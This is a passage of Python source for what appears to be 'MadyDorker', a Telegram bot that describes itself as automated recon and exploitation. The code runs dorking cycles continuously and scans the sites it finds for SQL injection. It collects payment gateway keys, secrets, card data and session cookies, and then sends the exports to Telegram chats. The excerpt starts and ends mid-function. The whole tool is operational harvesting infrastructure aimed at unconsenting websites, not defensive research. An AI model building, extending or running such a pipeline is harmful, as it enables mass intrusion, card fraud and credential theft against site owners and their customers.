        - Dork effectiveness scoring (productive dorks first)
        - Priority queue for URLs (high-value params first)
        - Concurrent URL processing (semaphore-bounded)
        - Content deduplication
        - Soft-404 filtering
        
        Args:
            dorks: Optional specific dorks to use (otherwise generates all)
            category: Optional category for targeted generation
        """
        self.cycle_count += 1
        logger.info(f"=== CYCLE {self.cycle_count} STARTING ===")
        
        # Generate dorks (in thread to avoid blocking event loop)
        if dorks is None:
            if category:
                dorks = await asyncio.to_thread(
                    lambda: self.generator.generate_targeted(category, max_count=500)
                )
            else:
                dorks = await asyncio.to_thread(
                    lambda: self.generator.generate_all(
                        max_total=self.config.max_dorks,
                        max_per_pattern=self.config.max_per_pattern,
                    )
                )
        
        # Use dork effectiveness scoring instead of plain shuffle
        if hasattr(self.searcher, 'dork_scorer') and self.searcher.dork_scorer:
            dorks = self.searcher.dork_scorer.sort_dorks(dorks)
            logger.info(f"Dorks sorted by effectiveness score")
        elif self.config.dork_shuffle:
            random.shuffle(dorks)
        
        logger.info(f"Processing {len(dorks)} dorks this cycle")
        await self._send_progress(
            f"🔄 <b>Cycle {self.cycle_count}</b> — Processing {len(dorks)} dorks...\n"
            f"Concurrent limit: {self.config.concurrent_url_limit}"
        )
        
        cycle_urls_found = 0
        cycle_findings = []  # Use list for thread-safe counting
        cycle_results = []
        cycle_cookies = 0
        
        for i, dork in enumerate(dorks):
            if not self.running:
                logger.info("Pipeline stopped, breaking cycle")
                break
            
            self.reporter.stats.dorks_processed += 1
            
            # Progress update every 10 dorks
            if (i + 1) % 10 == 0:
                await self._send_progress(
                    f"⏳ Dork <b>{i+1}/{len(dorks)}</b> | "
                    f"URLs found: {cycle_urls_found} | Hits: {len(cycle_findings)}"
                )
                # Warn if no results after first batch
                if (i + 1) == 10 and cycle_urls_found == 0:
                    await self._send_progress(
                        "⚠️ First 10 dorks returned 0 URLs. "
                        "Search engines may be rate-limiting or proxies may be dead."
                    )
                await asyncio.sleep(0)  # Yield to event loop
            
            try:
                # Search for URLs
                urls = await self.searcher.search(dork, self.config.results_per_dork)
                
                # Update dork scorer with results
                if hasattr(self.searcher, 'dork_scorer') and self.searcher.dork_scorer:
                    self.searcher.dork_scorer.record(dork, len(urls) if urls else 0)
                
                if not urls:
                    continue
                
                # Filter URLs
                filtered_urls = []
                for url in urls:
                    if self._should_skip_url(url):
                        continue
                    domain = urlparse(url).netloc
                    if domain in self.seen_domains:
                        continue
                    filtered_urls.append(url)
                
                if not filtered_urls:
                    continue
                
                # Sort by priority score (high-value params first)
                filtered_urls.sort(key=lambda u: self._score_url_priority(u), reverse=True)
                
                cycle_urls_found += len(filtered_urls)
                logger.info(f"[{i+1}/{len(dorks)}] Dork: {dork[:60]}... → {len(filtered_urls)} new URLs")
                
                # Notify when URLs found
                if len(filtered_urls) >= 3:
                    await self._send_progress(
                        f"🔗 Dork {i+1}: <b>{len(filtered_urls)} new URLs</b>\n"
                        f"<code>{dork[:80]}</code>"
                    )
                
                # Process URLs concurrently (bounded by semaphore)
                batch_results = []
                batch_findings = []
                
                tasks = []
                for url in filtered_urls:
                    if not self.running:
                        break
                    tasks.append(
                        self._process_url_safe(url, batch_results, batch_findings)
                    )
                
                if tasks:
                    # Run all URL tasks concurrently (semaphore inside process_url limits actual parallelism)
                    await asyncio.gather(*tasks, return_exceptions=True)
                    cycle_results.extend(batch_results)
                    cycle_findings.extend(batch_findings)
                
                # Delay between dorks
                delay = random.uniform(
                    self.config.search_delay_min,
                    self.config.search_delay_max,
                )
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Dork cycle error: {e}")
                continue
        
        # Save state after cycle
        self._save_state()
        
        # Count cookies found this cycle
        cookie_count = self.db.get_cookie_count() if hasattr(self, 'db') else 0
        b3_count = len(self.db.get_b3_cookies()) if hasattr(self, 'db') else 0
        
        summary = (
            f"✅ <b>Cycle {self.cycle_count} Complete</b>\n"
            f"Dorks: {len(dorks)} | URLs: {cycle_urls_found} | Hits: {len(cycle_findings)}\n"
            f"Total scanned: {self.urls_scanned} | Gateways: {len(self.found_gateways)} | "
            f"SQLi: {len(self.vulnerable_urls)} | Cards: {len(self.found_cards)}\n"
            f"🍪 Cookies: {cookie_count} | 🔵 B3: {b3_count}"
        )
        await self._send_progress(summary)
        logger.info(f"=== CYCLE {self.cycle_count} COMPLETE — "
                    f"{self.urls_scanned} URLs scanned, "
                    f"{len(self.found_gateways)} gateways, "
                    f"{len(self.vulnerable_urls)} SQLi vulns ===")

    async def start(self):
        """Start the full pipeline in continuous mode."""
        if self.running:
            return
        
        self.running = True
        self.start_time = datetime.now()
        
        logger.info("🚀 MadyDorker v3.0 Starting...")
        
        # Start proxy manager (load files, health check, background tasks)
        if self.proxy_manager:
            await self.proxy_manager.start(initial_health_check=self.config.proxy_health_check)
            if self.proxy_manager.has_proxies:
                logger.info(f"🔄 Proxies: {self.proxy_manager.alive_count}/{self.proxy_manager.total} alive")
        
        # Generate dorks in thread to avoid blocking event loop
        total_pool = await asyncio.to_thread(
            lambda: len(self.generator.generate_all())
        )
        per_cycle = self.config.max_dorks
        
        # Send startup notification
        proxy_status = "Disabled"
        if self.proxy_manager and self.proxy_manager.has_proxies:
            proxy_status = f"{self.proxy_manager.alive_count}/{self.proxy_manager.total} alive"
        
        engines = self.config.engines
        await self.reporter.report_startup({
            "Total Dork Pool": f"{total_pool:,}",
            "Per Cycle": f"{per_cycle:,}",
            "Concurrent URLs": self.config.concurrent_url_limit,
            "Engines": f"{len(engines)} ({', '.join(engines)})",
            "Search Delay": f"{self.config.search_delay_min}-{self.config.search_delay_max}s",
            "Cycle Delay": f"{self.config.cycle_delay}s",
            "Proxies": proxy_status,
            "SQLi": "Enabled" if self.config.sqli_enabled else "Disabled",
            "Dumper": "Enabled" if self.config.dumper_enabled else "Disabled",
            "WAF Detection": "Enabled" if self.config.waf_detection_enabled else "Disabled",
            "Secrets": "Enabled" if self.config.secret_extraction_enabled else "Disabled",
        })
        
        await self._send_progress(
            f"🚀 <b>Pipeline Started!</b>\n"
            f"Dork Pool: {total_pool:,} | Per Cycle: {per_cycle:,}\n"
            f"Engines: {len(engines)} | Concurrent: {self.config.concurrent_url_limit} URLs\n"
            f"Generating dorks and starting cycle..."
        )
        
        # Start status reporter and hourly export
        status_task = asyncio.create_task(self._status_loop())
        export_task = asyncio.create_task(self._export_loop())
        
        try:
            cycle = 0
            while self.running:
                cycle += 1
                
                if self.config.max_cycles > 0 and cycle > self.config.max_cycles:
                    logger.info(f"Max cycles ({self.config.max_cycles}) reached")
                    break
                
                await self.run_dork_cycle()
                
                if self.running and self.config.continuous:
                    logger.info(f"Cycle complete, waiting {self.config.cycle_delay}s before next...")
                    await asyncio.sleep(self.config.cycle_delay)
                else:
                    break
        
        except asyncio.CancelledError:
            logger.info("Pipeline cancelled")
        except Exception as e:
            logger.error(f"Pipeline error: {e}")
            await self.reporter.report_error(str(e), "main pipeline")
        finally:
            status_task.cancel()
            export_task.cancel()
            # Write final export on shutdown
            await self._write_export()
            self._save_state()
            if hasattr(self, 'db'):
                self.db.close()
            self.running = False
            logger.info("Pipeline stopped")

    async def stop(self):
        """Stop the pipeline."""
        self.running = False
        self._save_state()
        # Stop proxy manager background tasks
        if self.proxy_manager:
            await self.proxy_manager.stop()
        logger.info("Pipeline stop requested")

    async def _status_loop(self):
        """Periodically send status updates."""
        while self.running:
            try:
                await asyncio.sleep(300)  # Every 5 minutes
                if self.running:
                    stats = self.get_stats()
                    await self._send_progress(
                        f"📊 <b>Status Update</b>\n"
                        f"⏱ Uptime: {stats.get('uptime', 'N/A')}\n"
                        f"🔄 Cycles: {stats['cycles']} | URLs: {stats['urls_scanned']}\n"
                        f"🔑 Gateways: {stats['gateways_found']} | 💳 Cards: {stats['cards_found']}\n"
                        f"🔓 SQLi: {stats['sqli_vulns']} | 🔐 Secrets: {stats['secrets_found']}"
                    )
                    await self.reporter.report_status({
                        "Cycle": self.cycle_count,
                        "Seen Domains": len(self.seen_domains),
                        "Found Gateways": len(self.found_gateways),
                        "Found Cards": len(self.found_cards),
                    })
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Status loop error: {e}")

    async def _send_export_file(self, filepath: str):
        """Send an export file to the chat via Telegram."""
        if not self._chat_id:
            return
        stats = self.get_stats()
        caption = (
            f"📁 Auto-Export (every {self._auto_export_threshold} hits)\n"
            f"URLs: {stats['urls_scanned']} | "
            f"SQLi: {stats['sqli_vulns']} | "
            f"Secrets: {stats['secrets_found']} | "
            f"Gateways: {stats['gateways_found']} | "
            f"Cards: {stats['cards_found']}"
        )
        try:
            from telegram import Bot
            bot = Bot(token=self.reporter.bot_token)
            with open(filepath, 'rb') as f:
                await bot.send_document(
                    chat_id=self._chat_id,
                    document=f,
                    filename=os.path.basename(filepath),
                    caption=caption,
                )
            logger.info(f"Auto-export sent: {os.path.basename(filepath)}")
        except Exception as e:
            logger.debug(f"Auto-export send failed: {e}")
            await self._send_progress(
                f"📁 <b>Auto-Export Saved</b>\n"
                f"<code>{os.path.basename(filepath)}</code>\n"
                f"{caption}"
            )

    async def _export_loop(self):
        """Export a .txt report every hour with all findings."""
        while self.running:
            try:
                await asyncio.sleep(3600)  # Every 1 hour
                if self.running:
                    filepath = await self._write_export()
                    if filepath:
                        await self._send_progress(
                            f"📁 <b>Hourly Export Saved</b>\n"
                            f"<code>{os.path.basename(filepath)}</code>\n"
                            f"SQLi: {len(self.vulnerable_urls)} | "
                            f"Secrets: {len(self.found_secrets)} | "
                            f"Gateways: {len(self.found_gateways)} | "
                            f"Cards: {len(self.found_cards)}"
                        )
                        # Also send to report group
                        if self._report_chat_id:
                            await self._send_to_report_group(
                                f"📁 <b>Hourly Export #{self._export_counter}</b>\n"
                                f"⏱ Uptime: {self.get_stats().get('uptime', 'N/A')}\n"
                                f"URLs scanned: {self.urls_scanned}\n"
                                f"🔓 SQLi: {len(self.vulnerable_urls)}\n"
                                f"🔐 Secrets: {len(self.found_secrets)}\n"
                                f"🔑 Gateways: {len(self.found_gateways)}\n"
                                f"💳 Cards: {len(self.found_cards)}\n"
                                f"File: <code>{os.path.basename(filepath)}</code>"
                            )
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Export loop error: {e}")

    async def _write_export(self) -> Optional[str]:
        """Write a comprehensive .txt export of all findings."""
        self._export_counter += 1
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"dorker_export_{ts}.txt"
        filepath = os.path.join(self._export_dir, filename)
        
        stats = self.get_stats()
        
        lines = []
        lines.append("=" * 70)
        lines.append(f"  MadyDorker v3.15 — Hourly Export #{self._export_counter}")
        lines.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"  Uptime: {stats.get('uptime', 'N/A')}")
        lines.append("=" * 70)
        lines.append("")
        
        # — Summary —
        lines.append("--- SUMMARY ---")
        lines.append(f"Cycles completed: {self.cycle_count}")
        lines.append(f"URLs scanned: {self.urls_scanned}")
        lines.append(f"Domains seen: {len(self.seen_domains)}")
        lines.append(f"SQLi vulns: {len(self.vulnerable_urls)}")
        lines.append(f"Secrets found: {len(self.found_secrets)}")
        lines.append(f"Gateways found: {len(self.found_gateways)}")
        lines.append(f"Cards found: {len(self.found_cards)}")
        lines.append(f"Cookies: {stats.get('cookies_total', 0)} (B3: {stats.get('b3_cookies', 0)})")
        lines.append("")
        
        # — Vulnerable URLs (SQLi) —
        if self.vulnerable_urls:
            lines.append("--- VULNERABLE URLs (SQLi) ---")
            for v in self.vulnerable_urls:
                url = v.get('url', 'N/A')
                param = v.get('param', v.get('parameter', '?'))
                technique = v.get('technique', v.get('type', '?'))
                dbms = v.get('dbms', '?')
                lines.append(f"  [{technique}/{dbms}] param={param}")
                lines.append(f"    {url}")
            lines.append("")
        
        # — Secrets —
        if self.found_secrets:
            lines.append("--- SECRETS ---")
            for s in self.found_secrets:
                stype = s.get('type', 'unknown')
                value = s.get('value', '')[:80]
                source = s.get('url', s.get('source', 'N/A'))
                lines.append(f"  [{stype}] {value}")
                lines.append(f"    Source: {source}")
            lines.append("")
        
        # — Gateways —
        if self.found_gateways:
            lines.append("--- GATEWAYS ---")
            for g in self.found_gateways:
                url = g.get('url', 'N/A')
                gtype = g.get('type', g.get('gateway', '?'))
                lines.append(f"  [{gtype}] {url}")
            lines.append("")
        
        # — Cards —
        if self.found_cards:
            lines.append("--- CARDS ---")
            for c in self.found_cards:
                card = c if isinstance(c, str) else c.get('card', str(c))
                lines.append(f"  {card}")
            lines.append("")
        
        # — B3 Cookies —
        try:
            b3_cookies = self.db.get_b3_cookies()
            if b3_cookies:
                lines.append("--- B3 COOKIES ---")
                for bc in b3_cookies:
                    lines.append(f"  {bc.get('name', '?')}={bc.get('value', '?')[:60]}")
                    lines.append(f"    Domain: {bc.get('domain', '?')}")
                lines.append("")
        except Exception:
            pass
        
        # — All Scanned Domains —
        if self.seen_domains:
            lines.append("--- SCANNED DOMAINS ---")
            for d in sorted(self.seen_domains):
                lines.append(f"  {d}")
            lines.append("")
        
        # — Port Scan Results —
        try:
            port_scans = self.db.get_port_scans(limit=500)
            if port_scans:
                lines.append("--- PORT SCANS ---")
                by_domain = {}
                for ps in port_scans:
                    dom = ps.get('domain', '?')
                    if dom not in by_domain:
                        by_domain[dom] = []
                    by_domain[dom].append(ps)
                for dom, ports in sorted(by_domain.items()):
                    open_ports = [f"{p.get('port', '?')}/{p.get('service', '?')}" for p in ports]
                    lines.append(f"  {dom}: {', '.join(open_ports)}")
                lines.append("")
        except Exception:
            pass
        
        lines.append("=" * 70)
        lines.append(f"  End of export — {len(lines)} lines")
        lines.append("=" * 70)
        
        try:
            with open(filepath, 'w') as f:
                f.write("\n".join(lines))
            logger.info(f"Hourly export written: {filepath} ({len(lines)} lines)")
            self._last_export_time = datetime.now()
            return filepath
        except Exception as e:
            logger.error(f"Export write failed: {e}")
            return None

    def get_stats(self) -> Dict:
        """Get current statistics including DB stats."""
        uptime = ""
        if self.start_time:
            delta = datetime.now() - self.start_time
            hours = int(delta.total_seconds() // 3600)
            minutes = int((delta.total_seconds() % 3600) // 60)
            uptime = f"{hours}h {minutes}m"
        
        # Get DB stats
        db_stats = {}
        if hasattr(self, 'db'):
            try:
                db_stats = self.db.get_stats()
            except Exception:
                pass
        
        # Use DB counts (persisted) with in-memory as fallback
        gw_count = self.db.get_gateway_count() if hasattr(self, 'db') else len(self.found_gateways)
        sec_count = self.db.get_secret_count() if hasattr(self, 'db') else len(self.found_secrets)
        vuln_count = self.db.get_vuln_count() if hasattr(self, 'db') else len(self.vulnerable_urls)
        card_count = self.db.get_card_count() if hasattr(self, 'db') else len(self.found_cards)
        scan_count = db_stats.get("scans", self.urls_scanned)
        domain_count = db_stats.get("domains", len(self.seen_domains))
        
        return {
            "running": self.running,
            "uptime": uptime,
            "cycles": self.cycle_count,
            "urls_scanned": max(self.urls_scanned, scan_count),
            "seen_domains": max(len(self.seen_domains), domain_count),
            "gateways_found": gw_count,
            "secrets_found": sec_count,
            "sqli_vulns": vuln_count,
            "cards_found": card_count,
            "cookies_total": db_stats.get("cookies", 0),
            "b3_cookies": db_stats.get("b3_cookies", 0),
            "blocked_domains": len(self.db.get_blocked_domains()) if hasattr(self, 'db') else 0,
            "content_hashes": db_stats.get("content_hashes", 0),
            **self.reporter.get_stats(),
        }


# ==================== TELEGRAM BOT HANDLERS ====================

pipeline: Optional[MadyDorkerPipeline] = None
pipeline_task: Optional[asyncio.Task] = None
scan_tasks: Dict[int, asyncio.Task] = {}  # chat_id -> running scan task


def get_pipeline() -> MadyDorkerPipeline:
    """Get or create the pipeline instance."""
    global pipeline
    if pipeline is None:
        pipeline = MadyDorkerPipeline()
    return pipeline


def _build_main_menu():
    """Build the inline keyboard for the main menu."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Pipeline", callback_data="menu_pipeline"),
         InlineKeyboardButton("🎯 Scanning", callback_data="menu_scanning")],
        [InlineKeyboardButton("📊 Results", callback_data="menu_results"),
         InlineKeyboardButton("⚙️ Modules", callback_data="menu_modules")],
        [InlineKeyboardButton("📈 Live Status", callback_data="menu_status")],
    ])


def _build_stats_header() -> str:
    """Build the live stats header text."""
    p = get_pipeline()
    stats = p.get_stats()
    running = stats["running"]
    return (
        f"⚡ <b>MadyDorker v3.16</b>\n"
        f"<i>Automated Recon &amp; Exploitation</i>\n"
        f"\n"
        f"{'🟢 <b>ACTIVE</b>' if running else '⚫ Idle'}"
        f"  ·  🎯 <b>{stats['sqli_vulns']}</b> vulns"
        f"  ·  🔑 <b>{stats['gateways_found']}</b> keys"
        f"  ·  💳 <b>{stats['cards_found']}</b> cards\n"
    )


# ---- Section content builders ----

_SECTION_PIPELINE = (
    "\n"
    "🚀 <b>Pipeline Controls</b>\n"
    "\n"
    "/dorkon  ·  Start 24/7 dorking\n"
    "/dorkoff  ·  Stop pipeline\n"
    "/status  ·  Live dashboard\n"
)

_SECTION_SCANNING = (
    "\n"
    "🎯 <b>Scanning</b>\n"
    "\n"
    "/scan <code>&lt;url&gt;</code>  ·  Quick scan\n"
    "/deepscan <code>&lt;url&gt;</code>  ·  Full audit\n"
    "/mass <code>url1 url2 …</code>  ·  Batch up to 25\n"
    "/authscan <code>&lt;url&gt; cookies</code>  ·  Behind login\n"
    "/target <code>&lt;category&gt;</code>  ·  Focused scan\n"
    "/categories  ·  List all targets\n"
    "/stopscan  ·  Cancel active scan\n"
)

_SECTION_RESULTS = (
    "\n"
    "📊 <b>Results &amp; Data</b>\n"
    "\n"
    "/secrets  ·  Keys &amp; credentials\n"
    "/sqlistats  ·  Injection findings\n"
    "/dumps  ·  Extracted data\n"
    "/cookies  ·  Session &amp; B3 cookies\n"
    "/cookiehunt <code>&lt;url&gt;</code>  ·  Probe a site\n"
    "/dorkstats  ·  Dork effectiveness\n"
    "/export  ·  Download .txt report\n"
)

_SECTION_MODULES = (
    "\n"
    "⚙️ <b>Module Status</b>\n"
    "\n"
    "/proxy  ·  Proxy pool health\n"
    "/firecrawl  ·  Firecrawl engine\n"
    "/captcha  ·  Solver status\n"
    "/browser  ·  Headless browser\n"
    "/ecom  ·  E-commerce checker\n"
    "/crawlstats  ·  Recursive crawler\n"
    "/ports  ·  Port scanner\n"
    "/oob  ·  OOB SQLi injector\n"
    "/unionstats  ·  Union dumper\n"
    "/keys  ·  API key validator\n"
    "/mlfilter  ·  ML false-pos filter\n"
    "/setgroup  ·  Forward findings here\n"
)


async def _send_menu(message, text: str, back_button: bool = True):
    """Helper to send/edit a menu section."""
    kb = [[InlineKeyboardButton("« Back to Menu", callback_data="menu_main")]] if back_button else []
    kb_markup = InlineKeyboardMarkup(kb) if kb else _build_main_menu()
    await message.edit_text(text, parse_mode="HTML", reply_markup=kb_markup)


async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button presses for the main menu."""
    query = update.callback_query
    await query.answer()
    data = query.data
    header = _build_stats_header()

    if data == "menu_main":
        text = header + "\nSelect a section below."
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=_build_main_menu())

    elif data == "menu_pipeline":
        await _send_menu(query.message, header + _SECTION_PIPELINE)

    elif data == "menu_scanning":
        await _send_menu(query.message, header + _SECTION_SCANNING)

    elif data == "menu_results":
        await _send_menu(query.message, header + _SECTION_RESULTS)

    elif data == "menu_modules":
        await _send_menu(query.message, header + _SECTION_MODULES)

    elif data == "menu_status":
        p = get_pipeline()
        stats = p.get_stats()
        running = stats["running"]
        status_text = (
            header +
            "\n"
            "📈 <b>Live Dashboard</b>\n"
            "\n"
            f"⏱ Uptime: <b>{stats.get('uptime', '—')}</b>\n"
            f"🔄 Cycles: <b>{stats['cycles']}</b>\n"
            f"📋 Dorks run: <b>{stats.get('dorks_processed', 0):,}</b>\n"
            f"\n"
            f"🌐 URLs scanned: <b>{stats['urls_scanned']:,}</b>\n"
            f"🏷 Domains: <b>{stats['seen_domains']:,}</b>\n"
            f"🔓 SQLi vulns: <b>{stats['sqli_vulns']}</b>\n"
            f"🔑 Gateway keys: <b>{stats['gateways_found']}</b>\n"
            f"🔐 Secrets: <b>{stats['secrets_found']}</b>\n"
            f"💳 Cards: <b>{stats['cards_found']}</b>\n"
            f"🍪 Cookies: <b>{stats.get('cookies_total', 0)}</b> (B3: {stats.get('b3_cookies', 0)})\n"
            f"\n"
            f"📨 Messages: {stats.get('messages_sent', 0)}  ·  "
            f"❌ Errors: {stats.get('errors', 0)}  ·  "
            f"🚫 Blocked: {stats.get('blocked_domains', 0)}\n"
        )
        await _send_menu(query.message, status_text)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command — main menu with inline buttons."""
    header = _build_stats_header()
    text = header + "\nSelect a section below."
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=_build_main_menu())


async def cmd_dorkon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkon command — start pipeline."""
    global pipeline_task
    p = get_pipeline()
    if p.running:
        await update.message.reply_text("⚠️ Pipeline already running! Use /status to check.")
        return
    
    # Store telegram context for progress messages
    p.set_telegram_context(context.bot, update.effective_chat.id)
    
    total_dorks = await asyncio.to_thread(lambda: len(p.generator.generate_all()))
    per_cycle = p.config.max_dorks
    engines = p.config.engines
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  ⚡ <b>Pipeline Starting</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"\n"
        f"  📋 Total Dork Pool: <b>{total_dorks:,}</b>\n"
        f"  🔄 Per Cycle: <b>{per_cycle:,}</b>\n"
        f"  🔍 Engines: <b>{len(engines)}</b> ({', '.join(engines)})\n"
        f"  ⚡ Concurrent: <b>{p.config.concurrent_url_limit}</b> URLs\n"
        f"  ⏱ Search Delay: <b>{p.config.search_delay_min}-{p.config.search_delay_max}s</b>\n"
        f"  🔁 Cycle Delay: <b>{p.config.cycle_delay}s</b>\n"
        f"  🛡 WAF: {'✅' if p.config.waf_detection_enabled else '❌'}"
        f" | SQLi: {'✅' if p.config.sqli_enabled else '❌'}"
        f" | Secrets: {'✅' if p.config.secret_extraction_enabled else '❌'}\n"
        f"\n"
        f"  Use /status for live stats\n"
        f"  Use /dorkoff to stop\n"
        f"  /scan works while dorking\n",
        parse_mode="HTML",
    )
    
    # Start in background and store task reference
    pipeline_task = asyncio.create_task(p.start())


async def cmd_dorkoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkoff command — stop dorking pipeline."""
    global pipeline_task
    p = get_pipeline()
    if not p.running:
        await update.message.reply_text("Pipeline is not running.")
        return
    
    await p.stop()
    
    # Cancel the task if it's still running
    if pipeline_task and not pipeline_task.done():
        pipeline_task.cancel()
        try:
            await pipeline_task
        except asyncio.CancelledError:
            pass
    pipeline_task = None
    
    stats = p.get_stats()
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🛑 <b>Pipeline Stopped</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"\n"
        f"  ⏱ Uptime: {stats.get('uptime', 'N/A')}\n"
        f"  🔄 Cycles: {stats['cycles']}\n"
        f"  🌐 URLs: {stats['urls_scanned']}\n"
        f"  🎯 Vulns: {stats['sqli_vulns']}\n"
        f"  🔑 Keys: {stats['gateways_found']}\n"
        f"\n"
        f"  Use /dorkon to restart\n",
        parse_mode="HTML",
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command — live dashboard."""
    p = get_pipeline()
    stats = p.get_stats()
    
    status_icon = "🟢" if stats["running"] else "⚫"
    status_text = "ACTIVE" if stats["running"] else "IDLE"
    
    # Build a progress bar for cycle progress
    dorks_proc = stats.get('dorks_processed', 0)
    
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  {status_icon} <b>MadyDorker — {status_text}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"\n"
        f"  ⏱ Uptime: <b>{stats.get('uptime', '—')}</b>\n"
        f"  🔄 Cycles: <b>{stats['cycles']}</b>\n"
        f"  📋 Dorks run: <b>{dorks_proc:,}</b>\n"
        f"\n"
        "┌─── <b>SCANNING</b> ────────────┐\n"
        f"│  🌐 URLs scanned: <b>{stats['urls_scanned']:,}</b>\n"
        f"│  🏷 Domains seen: <b>{stats['seen_domains']:,}</b>\n"
        "│\n"
        "├─── <b>FINDINGS</b> ────────────┤\n"
        f"│  🔓 SQLi vulns: <b>{stats['sqli_vulns']}</b>\n"
        f"│  🔑 Gateway keys: <b>{stats['gateways_found']}</b>\n"
        f"│  🔐 Secrets: <b>{stats['secrets_found']}</b>\n"
        f"│  💳 Card data: <b>{stats['cards_found']}</b>\n"
        "│\n"
        "├─── <b>COOKIES</b> ─────────────┤\n"
        f"│  🍪 Total: <b>{stats.get('cookies_total', 0)}</b>\n"
        f"│  🔵 B3 traces: <b>{stats.get('b3_cookies', 0)}</b>\n"
        "│\n"
        "├─── <b>SYSTEM</b> ──────────────┤\n"
        f"│  📨 Messages: {stats.get('messages_sent', 0)}\n"
        f"│  ❌ Errors: {stats.get('errors', 0)}\n"
        f"│  🚫 Blocked: {stats.get('blocked_domains', 0)} domains\n"
        "└──────────────────────────┘\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cookies command — show ALL extracted cookies."""
    p = get_pipeline()
    
    text = "🍪 <b>Extracted Cookies</b>\n\n"
    
    if hasattr(p, 'db'):
        # B3 cookies (top priority section)
        b3_cookies = p.db.get_b3_cookies()
        if b3_cookies:
            text += f"🔵 <b>B3 Distributed Tracing ({len(b3_cookies)}):</b>\n"
            for entry in b3_cookies[:20]:
                text += f"  <b>{entry.get('name', '?')}</b>: <code>{entry.get('value', '?')[:60]}</code>\n"
                text += f"  📍 {entry.get('url', '?')[:50]}\n\n"
        else:
            text += "🔵 B3 Cookies: None found yet\n\n"
        
        # ALL cookies grouped by domain
        all_cookies = p.db.get_all_cookies()
        if all_cookies:
            # Group by domain
            by_domain = {}
            for entry in all_cookies:
                url = entry.get('url', '?')
                try:
                    domain = urlparse(url).netloc or url[:40]
                except Exception:
                    domain = url[:40]
                by_domain.setdefault(domain, []).append(entry)
            
            text += f"🌐 <b>All Cookies by Domain ({len(all_cookies)} total, {len(by_domain)} domains):</b>\n\n"
            
            for domain, cookies in sorted(by_domain.items())[:30]:
                text += f"<b>📍 {domain}</b>\n"
                for c in cookies[:10]:
                    name = c.get('name', '?')
                    value = c.get('value', '?')
                    ctype = c.get('type', '')
                    tag = ""
                    if ctype == "session":
                        tag = " 🔐"
                    elif ctype == "auth":
                        tag = " 🔑"
                    elif ctype == "b3":
                        tag = " 🔵"
                    text += f"  <code>{name}={value[:50]}</code>{tag}\n"
                if len(cookies) > 10:
                    text += f"  ... +{len(cookies) - 10} more\n"
                text += "\n"
        else:
            text += "🌐 No cookies collected yet.\n\n"
        
        # Stats
        session_cookies = p.db.get_session_cookies()
        text += f"📊 <b>Summary:</b> {len(all_cookies)} total | {len(session_cookies)} session/auth | {len(b3_cookies)} b3\n"
    else:
        text += "Database not initialized.\n"
    
    # Also show in-memory scanner cookies
    if hasattr(p, 'sqli_scanner'):
        b3_mem = p.sqli_scanner.get_b3_cookies()
        if b3_mem:
            text += f"\n🔵 <b>B3 from Current Session ({len(b3_mem)}):</b>\n"
            for url, cookies in list(b3_mem.items())[:10]:
                text += f"  📍 {url[:50]}\n"
                for name, value in cookies.items():
                    text += f"    {name}: <code>{value[:40]}</code>\n"
    
    # Cookie Hunter stats
    if hasattr(p, 'cookie_hunter') and p.cookie_hunter:
        text += f"\n{p.cookie_hunter.get_stats_text()}\n"
    
    # E-commerce checker stats
    if hasattr(p, 'ecom_checker') and p.ecom_checker:
        text += f"\n{p.ecom_checker.get_stats_text()}\n"
    
    if len(text) > 4000:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode="HTML")
    else:
        await update.message.reply_text(text, parse_mode="HTML")


async def cmd_cookiehunt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cookiehunt <url> command — actively hunt a URL for B3 + gateway cookies."""
    p = get_pipeline()
    
    if not p.cookie_hunter:
        await update.message.reply_text("❌ Cookie Hunter is not enabled. Set cookie_hunter_enabled=True in config.")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🍪 <b>Cookie Hunter</b>\n\n"
            "Usage: <code>/cookiehunt &lt;url&gt;</code>\n\n"
            "Actively probes the URL for:\n"
            "  🔵 B3 distributed tracing cookies/headers\n"
            "  🏦 Payment gateway cookies (Stripe, Braintree, PayPal, etc.)\n"
            "  🛒 Commerce/checkout cookies\n"
            "  🔍 Gateway SDK detection in HTML\n"
            "  📡 Checkout page probing\n\n"
            "Or use <code>/cookiehunt stats</code> for hunt statistics.",
            parse_mode="HTML",
        )
        return
    
    if args[0].lower() == "stats":
        text = p.cookie_hunter.get_stats_text()
        await update.message.reply_text(text, parse_mode="HTML")
        return
    
    url = args[0]
    if not url.startswith("http"):
        url = f"https://{url}"
    
    await update.message.reply_text(f"🍪 Hunting cookies at <code>{url[:80]}</code>...", parse_mode="HTML")
    
    try:
        result = await p.cookie_hunter.hunt_and_report(url)
        
        text = f"🍪 <b>Cookie Hunt Results</b>\n\n"
        text += f"<b>URL:</b> <code>{url[:80]}</code>\n"
        text += f"<b>Probe time:</b> {result.probing_time:.1f}s\n\n"
        
        if result.b3_finds:
            text += f"🔵 <b>B3 Tracing ({len(result.b3_finds)}):</b>\n"
            for f in result.b3_finds:
